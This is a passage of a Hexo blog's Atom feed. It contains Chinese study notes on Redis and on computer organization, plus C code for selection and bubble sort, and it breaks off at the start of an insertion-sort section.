<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM</title>
  
  <subtitle>安全小白</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2021-01-18T14:18:56.255Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>Caoyifan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis学习</title>
    <link href="elssm.github.io/2021/01/18/Redis%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/01/18/Redis学习/</id>
    <published>2021-01-18T14:16:56.000Z</published>
    <updated>2021-01-18T14:18:56.255Z</updated>
    
    <content type="html"><![CDATA[<p>NoSQL数据库的四大分类</p><ul><li>KV键值对（Redis）</li><li>文档型数据库（bson，MongoDb）</li><li>列存储数据库（分布式文件系统，HBase）</li><li>图关系数据库（Infinite Graph）</li></ul><p>传统数据库</p><ul><li>Atomicity：原子性</li><li>Consistency：一致性</li><li>Isolation：独立性</li><li>Durability：持久性</li></ul><p>NoSQL</p><ul><li>Consistency：强一致性</li><li>Availability：可用性</li><li>Partition tolerance：分区容错性</li></ul><p>CA：单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大</p><p>CP：满足一致性，分区容忍性的系统，通常性能不是特别高</p><p>AP：满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。</p><p>BASE为了解决关系数据库强一致性引起的问题而引起的可用性降低而提出的解决方案</p><ul><li>基本可用（Basically Available）</li><li>软状态（Soft state）</li><li>最终一致（Eventually consistent）</li></ul><p>分布式：不同的多台服务器上面部署不同的服务模块</p><p>集群：不同的多台服务器上面部署相同的服务模块</p><p>Redis的三个特点：</p><ul><li>支持数据的持久化，可以将内存中的数据保持在磁盘中</li><li>不仅支持key-value类型，还提供list，set，zset，hash等数据结构</li><li>支持数据的备份，即master-slave模式的数据备份</li></ul><p>日志级别</p><ul><li>debug</li><li>verbose</li><li>notice</li><li>warning</li></ul><p>缓存策略</p><ul><li>Volatile-lru（只对设置了过期时间的key）</li><li>Allkeys-lru</li><li>Volatile-random（只对设置了过期时间的key）</li><li>Alleys-random</li><li>Volatile-ttl（移除那些TTL值最小的key）</li><li>Noeviction（不进行移除）</li></ul><p>RDB（Redis DataBase）</p><ul><li><p>在指定的时间间隔内将内存中的数据集快照写入磁盘</p><ul><li>1分钟内改了1w次</li><li>5分钟内改了10次</li><li>15分钟内改了1次</li></ul></li><li><p>劣势</p><p>在一定间隔时间做一次备份，所以如果redis意外down掉的话，就会丢失最后一次快照后的所有修改</p><p>Fork的时候，内存中的数据被克隆了一份，大致2倍的膨胀性需要考虑</p></li></ul><p>AOF（Append Only File）</p><ul><li><p>以日志的形式来记录每一个写操作</p></li><li><p>Apendfsync</p><p>Always：同步持久化，每次发生数据变更会被立即记录到磁盘，性能较差但是数据完整性比较好</p><p>Everysec：出厂默认推荐，异步操作，每秒记录，如果一秒内宕机。有数据丢失</p><p>No</p></li></ul><p>Rewrite：AOF文件持续增长而过大时，会fork出一个新进程来将文件重写（先写临时文件最后rename）</p><ul><li>触发机制：默认配置是当AOF文件大小是上次rewrite之后大小的一倍且文件大于64M</li></ul><p>事务：一个队列中一次性、顺序性、排他性的执行一系列命令</p><ul><li>MULTI</li><li>discard</li><li>EXEC</li></ul><p>悲观锁：锁整张表</p><p>乐观锁：版本号</p><p>主从复制：主机数据更新后根据配置和策略，自动同步到备机的master/slaver机制，master以写为主，slave以读为主</p><ul><li>主要用于读写分离和容灾恢复</li></ul><p>常用三招</p><ul><li>一主二仆</li><li>薪火相传</li><li>反客为主（slaveof no one）</li></ul><p>复制原理</p><ul><li>slave启动成功连接到master后会发送一个sync命令</li><li>master接到命令启动后台的存盘进程，同时手机所有接收到的用于修改数据集命令。在后台进程执行完毕之后，master将传送整个数据文件到slave，以完成一次完全同步</li><li>全局复制：slave服务在接收到数据库文件数据后，将其存盘并加载到内存中</li><li>增量复制：Master继续将新的所有收集到的修改命令依次传给slave完成同步</li><li>但是只要重新连接master，依次完全同步（全局复制）将被自动执行</li></ul><p>哨兵模式：反客为主的自动版</p><ul><li>新建sentinel.conf</li><li>配置哨兵：sentinel monitor 主机名 127.0.0.1 6379 1</li><li>启动哨兵：redis-sentinel /文件路径/sentinel.conf</li></ul><p>主从复制会出现复制延迟</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;NoSQL数据库的四大分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;KV键值对（Redis）&lt;/li&gt;
&lt;li&gt;文档型数据库（bson，MongoDb）&lt;/li&gt;
&lt;li&gt;列存储数据库（分布式文件系统，HBase）&lt;/li&gt;
&lt;li&gt;图关系数据库（Infinite Graph）&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>组成原理笔记</title>
    <link href="elssm.github.io/2018/11/01/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2018/11/01/组成原理笔记/</id>
    <published>2018-11-01T12:44:54.000Z</published>
    <updated>2018-11-01T13:04:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="计算机系统的层次结构"><a href="#计算机系统的层次结构" class="headerlink" title="计算机系统的层次结构"></a>计算机系统的层次结构</h3><ul><li><h4 id="系统复杂性管理的方法1"><a href="#系统复杂性管理的方法1" class="headerlink" title="系统复杂性管理的方法1"></a>系统复杂性管理的方法1</h4><p>抽象</p></li><li><h4 id="系统复杂性管理的方法2（3Y）"><a href="#系统复杂性管理的方法2（3Y）" class="headerlink" title="系统复杂性管理的方法2（3Y）"></a>系统复杂性管理的方法2（3Y）</h4><p>层次化（Hierachy）：将被设计的系统划分为多个模块和子模块</p><p>模块化（Modularity）：有明确定义的功能和接口</p><p>规则性（Regularity）：模块更容易被重用</p></li><li><h4 id="冯诺伊曼计算机的特点"><a href="#冯诺伊曼计算机的特点" class="headerlink" title="冯诺伊曼计算机的特点"></a>冯诺伊曼计算机的特点</h4><p>计算机由五大部件组成（存储器，控制器，运算器，输入设备，输出设备）</p><p>指令和数据以同等地位存于存储器，可按地址访问</p><p>指令和数据用二进制表示</p><p>指令由操作码和地址码组成</p><p>存储程序</p><p>以运算器为中心</p></li></ul><h4 id="运算器的组成"><a href="#运算器的组成" class="headerlink" title="运算器的组成"></a>运算器的组成</h4><p>运算单元（ALU）</p><p>输入数据寄存器（ACC和X）</p><p>额外数据寄存器（MQ）</p><h4 id="存储器的基本组成"><a href="#存储器的基本组成" class="headerlink" title="存储器的基本组成"></a>存储器的基本组成</h4><p><img src="/01/组成原理笔记/1.png" alt="1"></p><p>MAR：存储器地址寄存器（反应存储单元的个数）</p><p>MDR：存储器数据寄存器（存储器数据寄存器反映存储字长）</p><p>存储体–存储单元–存储元件</p><p>存储单元：存放一串二进制代码</p><p>存储字：存储单元中二进制代码的组合</p><p>存储字长：存储单元中二进制代码的位数，每个存储单元赋予一个地址 </p><p>按地址寻访</p><h4 id="控制器的功能"><a href="#控制器的功能" class="headerlink" title="控制器的功能"></a>控制器的功能</h4><p>解释指令</p><p>保证指令的按序执行</p><h4 id="完成一条指令"><a href="#完成一条指令" class="headerlink" title="完成一条指令"></a>完成一条指令</h4><ul><li>取指令    PC（存放当前欲执行指令的地址，具有计数功能PC+1=PC）</li><li>分析指令    IR（存放当前欲执行的指令）</li><li>执行指令    CU</li></ul><h4 id="计算机硬件的主要技术指标"><a href="#计算机硬件的主要技术指标" class="headerlink" title="计算机硬件的主要技术指标"></a>计算机硬件的主要技术指标</h4><ul><li>机器字长：CPU一次能处理数据的位数，与CPU中的寄存器位数有关</li></ul><h3 id="运算速度"><a href="#运算速度" class="headerlink" title="运算速度"></a>运算速度</h3><ul><li>主频</li><li>核数，每个核支持的线程数</li><li>吉普森法</li><li>CPI 执行一条指令所需时钟周期数</li><li>MIPS 每秒执行百万条指令</li></ul><h4 id="存储容量"><a href="#存储容量" class="headerlink" title="存储容量"></a>存储容量</h4><p>存放二进制信息的总位数</p><h4 id="硬件技术对计算机更新换代的影响"><a href="#硬件技术对计算机更新换代的影响" class="headerlink" title="硬件技术对计算机更新换代的影响"></a>硬件技术对计算机更新换代的影响</h4><p>   时间            硬件技术</p><p>1946-1957        电子管</p><p>1958-1964        晶体管</p><p>1965-1971        中小规模集成电路</p><p>1972-1977        大规模集成电路</p><p>1978-现在        超大规模集成电路</p><h4 id="微型计算机的出现和发展"><a href="#微型计算机的出现和发展" class="headerlink" title="微型计算机的出现和发展"></a>微型计算机的出现和发展</h4><p>微处理器芯片 1971</p><p>存储器芯片     1970</p><h4 id="芯片集成度的提高受以下三方面的限制"><a href="#芯片集成度的提高受以下三方面的限制" class="headerlink" title="芯片集成度的提高受以下三方面的限制"></a>芯片集成度的提高受以下三方面的限制</h4><ul><li>芯片集成度受物理极限的制约</li><li>按几何级数递增的制作成本</li><li>芯片的功耗，散热，线延迟</li></ul><h3 id="总线的基本概念"><a href="#总线的基本概念" class="headerlink" title="总线的基本概念"></a>总线的基本概念</h3><h4 id="什么是总线？"><a href="#什么是总线？" class="headerlink" title="什么是总线？"></a>什么是总线？</h4><p>总显示连接各个部件的信号传输线，是各个部件共享的传输介质</p><h4 id="总线上信息的传递"><a href="#总线上信息的传递" class="headerlink" title="总线上信息的传递"></a>总线上信息的传递</h4><p>串行：一条数据线</p><p>并行：多条数据线</p><h4 id="单总线结构框图"><a href="#单总线结构框图" class="headerlink" title="单总线结构框图"></a>单总线结构框图</h4><p><img src="/01/组成原理笔记/2.png" alt="2"></p><h4 id="面向CPU的双总线结构框图"><a href="#面向CPU的双总线结构框图" class="headerlink" title="面向CPU的双总线结构框图"></a>面向CPU的双总线结构框图</h4><p><img src="/01/组成原理笔记/3.png" alt="3"></p><h4 id="以存储器为中心的双总线结构框图"><a href="#以存储器为中心的双总线结构框图" class="headerlink" title="以存储器为中心的双总线结构框图"></a>以存储器为中心的双总线结构框图</h4><p><img src="/01/组成原理笔记/4.png" alt="4"></p><h3 id="总线的分类"><a href="#总线的分类" class="headerlink" title="总线的分类"></a>总线的分类</h3><p>1：片内总线    芯片内部的总线</p><p>2：系统总线    计算机各部件之间的信息传输线</p><ul><li>数据总线        （双向 与机器字长，存储字长有关）</li><li>地址总线         （单向 与存储地址，I/O地址有关）</li><li>控制总线         （有出 有入）</li></ul><p>3：通信总线</p><p>用于计算机系统之间或计算机系统与其他系统（如控制仪表，移动通信等）之间的通信</p><ul><li>串行通信总线</li><li>并行通信总线</li></ul><h3 id="总线特性及性能指标"><a href="#总线特性及性能指标" class="headerlink" title="总线特性及性能指标"></a>总线特性及性能指标</h3><h4 id="总线特性"><a href="#总线特性" class="headerlink" title="总线特性"></a>总线特性</h4><ul><li>机械特性    尺寸，形状，管脚数及排列顺序</li><li>电气特性    传输方向和有效的电平范围</li><li>功能特性    每根传输线的功能（如地址，数据，控制）</li><li>时间特性    信号的时序关系</li></ul><h4 id="总线的性能指标"><a href="#总线的性能指标" class="headerlink" title="总线的性能指标"></a>总线的性能指标</h4><ul><li>总线宽度    （数据线的根数）</li><li>标准传输率    （每秒传输的最大字节数（MBps））</li><li>时钟同步    （异步    同步，不同步）</li><li>总线复用    （地址线与数据线复用）</li><li>信号线数    （地址线，数据线和控制线的总和）</li><li>总线控制方式    （突发，自动，仲裁，逻辑，计数）</li><li>其他指标     （负载能力）</li></ul><h4 id="总线标准"><a href="#总线标准" class="headerlink" title="总线标准"></a>总线标准</h4><p><img src="/01/组成原理笔记/5.png" alt="5"></p><h3 id="总线结构"><a href="#总线结构" class="headerlink" title="总线结构"></a>总线结构</h3><h4 id="单总线结构"><a href="#单总线结构" class="headerlink" title="单总线结构"></a>单总线结构</h4><p><img src="/01/组成原理笔记/6.png" alt="6"></p><h4 id="多总线结构"><a href="#多总线结构" class="headerlink" title="多总线结构"></a>多总线结构</h4><p>双总线结构</p><p><img src="/01/组成原理笔记/7.png" alt="7"></p><p>三总线结构</p><p><img src="/01/组成原理笔记/8.png" alt="8"></p><p>三总线结构另一种形式</p><p><img src="/01/组成原理笔记/9.png" alt="9"></p><p>四总线结构</p><p><img src="/01/组成原理笔记/10.png" alt="10"></p><h4 id="总线结构举例"><a href="#总线结构举例" class="headerlink" title="总线结构举例"></a>总线结构举例</h4><p>传统微型机总线结构</p><p><img src="/01/组成原理笔记/11.png" alt="11"></p><p>VL-BUS局部总线结构</p><p><img src="/01/组成原理笔记/12.png" alt="12"></p><p>PCI总线结构</p><p><img src="/01/组成原理笔记/13.png" alt="13"></p><p>多层PCI总线结构</p><p><img src="/01/组成原理笔记/14.png" alt="14"></p><h3 id="总线控制"><a href="#总线控制" class="headerlink" title="总线控制"></a>总线控制</h3><h4 id="总线判优控制"><a href="#总线判优控制" class="headerlink" title="总线判优控制"></a>总线判优控制</h4><p>根据是否能提出总线请求将总线上的设备分为两类</p><ul><li>主设备（或者是主模块）对总线有控制权</li><li>从设备（或者是从模块）响应从主设备发来的总线命令</li></ul><p>总线判优控制</p><ul><li>集中式（链式查询，计数器定时查询，独立请求方式）</li><li>分布式</li></ul><h4 id="链式查询方式"><a href="#链式查询方式" class="headerlink" title="链式查询方式"></a>链式查询方式</h4><p>电路控制结构</p><p><img src="/01/组成原理笔记/15.png" alt="15"></p><h4 id="计数器定时查询方式（总线控制部件中有一个计数器）"><a href="#计数器定时查询方式（总线控制部件中有一个计数器）" class="headerlink" title="计数器定时查询方式（总线控制部件中有一个计数器）"></a>计数器定时查询方式（总线控制部件中有一个计数器）</h4><p>电路控制结构</p><p><img src="/01/组成原理笔记/16.png" alt="16"></p><h4 id="独立请求方式（总线控制部件内部有一个排队器）"><a href="#独立请求方式（总线控制部件内部有一个排队器）" class="headerlink" title="独立请求方式（总线控制部件内部有一个排队器）"></a>独立请求方式（总线控制部件内部有一个排队器）</h4><p>电路控制结构</p><p><img src="/01/组成原理笔记/17.png" alt="17"></p><h4 id="总线通信控制"><a href="#总线通信控制" class="headerlink" title="总线通信控制"></a>总线通信控制</h4><p>1 目的：解决通信双方协调配合问题</p><p>2 总线传输周期</p><ul><li>申请分配阶段    （主模块申请，总线仲裁决定）</li><li>寻址阶段    （主模块向从模块给出地址和命令）</li><li>传数阶段    （主模块和从模块交换数据）</li><li>结束阶段     （主模块撤消有关信息）   </li></ul><h4 id="总线通信的四种方式"><a href="#总线通信的四种方式" class="headerlink" title="总线通信的四种方式"></a>总线通信的四种方式</h4><ul><li>同步通信（由统一时标控制数据传送）</li><li>异步通信（采用应答方式，没有公共时钟标准）</li><li>半同步通信（同步，异步结合）</li><li>分离式通信（充分挖掘系统总线每个瞬间的潜力）</li></ul><h4 id="同步式数据输入"><a href="#同步式数据输入" class="headerlink" title="同步式数据输入"></a>同步式数据输入</h4><p><img src="/01/组成原理笔记/18.png" alt="18"></p><h4 id="同步式数据输出"><a href="#同步式数据输出" class="headerlink" title="同步式数据输出"></a>同步式数据输出</h4><p><img src="/01/组成原理笔记/19.png" alt="19"></p><h4 id="异步通信"><a href="#异步通信" class="headerlink" title="异步通信"></a>异步通信</h4><p><img src="/01/组成原理笔记/20.png" alt="20"></p><h4 id="半同步通信（同步，异步结合）"><a href="#半同步通信（同步，异步结合）" class="headerlink" title="半同步通信（同步，异步结合）"></a>半同步通信（同步，异步结合）</h4><p>同步：发送方用系统时钟前沿发信号，接收方用系统时钟后沿判断，识别</p><p>异步：允许不同速度的模块和谐工作，增加一条等待响应信号 WAIT</p><h4 id="一个总线传输周期（以输入数据为例）"><a href="#一个总线传输周期（以输入数据为例）" class="headerlink" title="一个总线传输周期（以输入数据为例）"></a>一个总线传输周期（以输入数据为例）</h4><ul><li>主模块发地址，命令（占用总线）</li><li>从模块准备数据（不占用总线，总线空闲）</li><li>从模块向主模块发数据（占用总线）</li></ul><h4 id="分离式通信"><a href="#分离式通信" class="headerlink" title="分离式通信"></a>分离式通信</h4><p>充分挖掘系统总线每个瞬间的潜力</p><h4 id="一个总线传输周期"><a href="#一个总线传输周期" class="headerlink" title="一个总线传输周期"></a>一个总线传输周期</h4><ul><li>子周期1：主模块申请占用总线，使用完后即放弃总线的使用权</li><li>子周期2：从模块申请占用总线，将各种信息送至总线上</li></ul><h4 id="分离式通信特点"><a href="#分离式通信特点" class="headerlink" title="分离式通信特点"></a>分离式通信特点</h4><p>1：各模块有权申请占用总线</p><p>2：采用同步方式通信，不等对方回答</p><p>3：各模块准备数据时，不占用总线</p><p>4：总线被占用时，无空闲</p><h3 id="存储器分类"><a href="#存储器分类" class="headerlink" title="存储器分类"></a>存储器分类</h3><ul><li>按存储介质分类<ul><li>半导体存储器（TTL,MOS）易失性</li><li>磁表面存储器（磁头，载磁体）非失性</li><li>磁芯存储器（硬磁材料，环状元件）非失性</li><li>光盘存储器（激光，磁光材料）非失性</li></ul></li><li>按存取方式分类<ul><li>存取时间与物理地址无关（随机访问）<ul><li>随机存储器（在程序的执行过程中可读可写）</li><li>只读存储器（在程序的执行过程中只读）</li></ul></li><li>存取时间与物理地址有关（串行访问）<ul><li>顺序存取存储器（磁带）</li><li>直接存取存储器（磁盘）</li></ul></li></ul></li><li>按在计算机中的作用分类<ul><li>主存储器<ul><li>RAM（静态RAM,动态RAM）</li><li>ROM（MROM,PROM,EPROM,EEPROM）</li></ul></li><li>Flash Memory</li><li>高速缓冲存储器（Cache）</li><li>辅助存储器（磁盘，磁带，光盘）</li></ul></li></ul><h3 id="主存的技术指标"><a href="#主存的技术指标" class="headerlink" title="主存的技术指标"></a>主存的技术指标</h3><p>存储容量（主存存放二进制代码的总位数）</p><p>存储时间</p><ul><li>存储时间（存储器的访问时间，读出时间，写入时间）</li><li>存取周期（连续两次独立的存储器操作所需要的最小时间间隔，读周期，写周期）</li><li>存储器的带宽（位/秒）</li></ul><h4 id="动态RAM和静态RAM的比较"><a href="#动态RAM和静态RAM的比较" class="headerlink" title="动态RAM和静态RAM的比较"></a>动态RAM和静态RAM的比较</h4><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">DRAM</th><th style="text-align:center">SRAM</th></tr></thead><tbody><tr><td style="text-align:center">存储原理</td><td style="text-align:center">电容</td><td style="text-align:center">触发器</td></tr><tr><td style="text-align:center">集成度</td><td style="text-align:center">高</td><td style="text-align:center">低</td></tr><tr><td style="text-align:center">芯片引脚</td><td style="text-align:center">少</td><td style="text-align:center">多</td></tr><tr><td style="text-align:center">功耗</td><td style="text-align:center">小</td><td style="text-align:center">大</td></tr><tr><td style="text-align:center">价格</td><td style="text-align:center">低</td><td style="text-align:center">高</td></tr><tr><td style="text-align:center">速度</td><td style="text-align:center">慢</td><td style="text-align:center">快</td></tr><tr><td style="text-align:center">刷新</td><td style="text-align:center">有</td><td style="text-align:center">无</td></tr></tbody></table><h4 id="只读存储器（ROM）"><a href="#只读存储器（ROM）" class="headerlink" title="只读存储器（ROM）"></a>只读存储器（ROM）</h4><ul><li>掩模ROM（MROM）</li><li>PROM（一次性编程）</li><li>EPROM（多次性编程）</li><li>EEPROM（多次性编程）</li><li>FLASH Memory（闪存型存储器）</li></ul><h4 id="存储器与CPU的连接"><a href="#存储器与CPU的连接" class="headerlink" title="存储器与CPU的连接"></a>存储器与CPU的连接</h4><ul><li>地址线得连接</li><li>数据线的链接</li><li>读/写命令线的连接</li><li>片选线的连接</li><li>合理选择存储芯片</li><li>其他   时序，负载 </li></ul><h4 id="存储器的校验"><a href="#存储器的校验" class="headerlink" title="存储器的校验"></a>存储器的校验</h4><p>编码的最小距离</p><ul><li><p>任意两组合法代码之间二进制位数的最小差异</p></li><li><p>编码的纠错，检错能力与编码的最小距离有关</p><p>L-1=D+C（D&gt;=C）</p><p>L——编码的最小距离</p><p>D——检测错误的位数</p><p>C——纠正错位的位数</p></li></ul><h4 id="汉明码的组成"><a href="#汉明码的组成" class="headerlink" title="汉明码的组成"></a>汉明码的组成</h4><ul><li>汉明码采用奇偶校验</li><li>汉明码采用分组校验</li></ul><h4 id="提高访存速度的措施"><a href="#提高访存速度的措施" class="headerlink" title="提高访存速度的措施"></a>提高访存速度的措施</h4><ul><li>采用高速器件</li><li>采用层次结构 Cache-主存</li><li>调整主存结构</li></ul><h3 id="输入输出系统的组成"><a href="#输入输出系统的组成" class="headerlink" title="输入输出系统的组成"></a>输入输出系统的组成</h3><p>I/O软件</p><ul><li><p>I/O指令（CPU指令的一部分）</p><p>格式：|操作码|命令码|设备码|</p></li><li><p>通道指令（通道自身的指令）</p><p>指出数组的首地址，传送字数。操作命令</p></li></ul><p>I/O硬件</p><ul><li>设备    I/O接口</li><li>设备        设备控制器        通道</li></ul><h3 id="I-O设备与主机的联系方式"><a href="#I-O设备与主机的联系方式" class="headerlink" title="I/O设备与主机的联系方式"></a>I/O设备与主机的联系方式</h3><p>统一编址（用取数，存数指令）</p><p>不统一编址（有专门的I/O指令）</p><h3 id="联络方式"><a href="#联络方式" class="headerlink" title="联络方式"></a>联络方式</h3><p>立即响应</p><p>异步工作采用应答信号（并行传输和串行传输）</p><h3 id="I-O设备与主机的连接方式"><a href="#I-O设备与主机的连接方式" class="headerlink" title="I/O设备与主机的连接方式"></a>I/O设备与主机的连接方式</h3><p>辐射式连接（不便于增删设备）</p><p>总线连接（便于增删设备）</p><h3 id="I-O设备与主机信息传送的控制方式"><a href="#I-O设备与主机信息传送的控制方式" class="headerlink" title="I/O设备与主机信息传送的控制方式"></a>I/O设备与主机信息传送的控制方式</h3><p>程序查询方式</p><p>程序中断方式</p><p>DMA方式</p><h3 id="I-O接口"><a href="#I-O接口" class="headerlink" title="I/O接口"></a>I/O接口</h3><h4 id="为什么要设置接口？"><a href="#为什么要设置接口？" class="headerlink" title="为什么要设置接口？"></a>为什么要设置接口？</h4><ul><li>实现设备的选择</li><li>实现数据缓冲达到速度匹配</li><li>实现数据串-并格式转换</li><li>实现电平转换</li><li>传送控制命令</li><li>反映设备的状态</li></ul><h4 id="接口的功能和组成"><a href="#接口的功能和组成" class="headerlink" title="接口的功能和组成"></a>接口的功能和组成</h4><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">组成</th></tr></thead><tbody><tr><td style="text-align:center">选址功能</td><td style="text-align:center">设备选择电路</td></tr><tr><td style="text-align:center">传送命令的功能</td><td style="text-align:center">命令寄存器，命令译码器</td></tr><tr><td style="text-align:center">传送数据的功能</td><td style="text-align:center">数据缓冲寄存器（DBR）</td></tr><tr><td style="text-align:center">反映设备状态的功能</td><td style="text-align:center">设备状态标记</td></tr></tbody></table><h3 id="接口类型"><a href="#接口类型" class="headerlink" title="接口类型"></a>接口类型</h3><h4 id="按数据传送方式分类"><a href="#按数据传送方式分类" class="headerlink" title="按数据传送方式分类"></a>按数据传送方式分类</h4><ul><li><p>并行接口（Intel 8255）</p></li><li><p>串行接口（Intel 8251）</p></li></ul><h4 id="按功能选择的灵活性分类"><a href="#按功能选择的灵活性分类" class="headerlink" title="按功能选择的灵活性分类"></a>按功能选择的灵活性分类</h4><ul><li><p>可编程接口（Intel 8255，Intel 8251）</p></li><li><p>不可编程接口（Intel 8212）</p></li></ul><h4 id="按通用性分类"><a href="#按通用性分类" class="headerlink" title="按通用性分类"></a>按通用性分类</h4><ul><li>通用接口（Intel 8255，Intel 8251）</li><li>专用接口（Intel 8279，Intel 8275）</li></ul><h4 id="按数据传送的控制方式分类"><a href="#按数据传送的控制方式分类" class="headerlink" title="按数据传送的控制方式分类"></a>按数据传送的控制方式分类</h4><ul><li>中断方式（Intel 8259）</li><li>DMA接口（Intel 8257）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;计算机系统的层次结构&quot;&gt;&lt;a href=&quot;#计算机系统的层次结构&quot; class=&quot;headerlink&quot; title=&quot;计算机系统的层次结构&quot;&gt;&lt;/a&gt;计算机系统的层次结构&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;h4 id=&quot;系统复杂性管理的方法1&quot;&gt;&lt;a href=&quot;#系
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>C语言八大排序</title>
    <link href="elssm.github.io/2018/10/09/C%E8%AF%AD%E8%A8%80%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F/"/>
    <id>elssm.github.io/2018/10/09/C语言八大排序/</id>
    <published>2018-10-09T09:54:40.000Z</published>
    <updated>2018-12-03T14:05:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近一段时间对8大排序算法进行了整理，并用C语言进行了简单的实现。</p><ul><li><h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,t;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;s;j++)</span><br><span class="line"><span class="keyword">if</span>(a[i]&gt;a[j])</span><br><span class="line">&#123;</span><br><span class="line">t=a[i];</span><br><span class="line">a[i]=a[j];</span><br><span class="line">a[j]=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">selectSort(a,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="起泡-冒泡排序"><a href="#起泡-冒泡排序" class="headerlink" title="起泡/冒泡排序"></a>起泡/冒泡排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,flag=<span class="number">1</span>,t;</span><br><span class="line"><span class="keyword">for</span>(i=high;i&gt;<span class="number">0</span>&amp;&amp;flag;i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line"><span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t=a[j];</span><br><span class="line">a[j]=a[j+<span class="number">1</span>];</span><br><span class="line">a[j+<span class="number">1</span>]=t;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>&#125;; </span><br><span class="line">BubbleSort(a,<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%3d"</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="插入排序1"><a 